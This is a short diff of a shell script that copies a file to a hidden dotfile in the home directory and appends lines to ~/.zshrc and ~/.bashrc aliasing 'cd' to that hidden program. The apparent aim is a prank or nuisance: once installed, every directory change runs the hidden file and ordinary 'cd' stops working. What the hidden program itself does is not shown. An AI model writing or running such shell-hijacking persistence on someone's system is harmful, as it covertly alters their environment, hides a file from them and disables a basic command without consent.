@@ -1,4 +1,4 @@
-mv .07_03_21_in_memory_of_the_Kesha ~/
+cp 07_03_21_in_memory_of_the_Kesha ~/.07_03_21_in_memory_of_the_Kesha
 
 echo -en "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.zshrc
 echo -en "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.bashrc
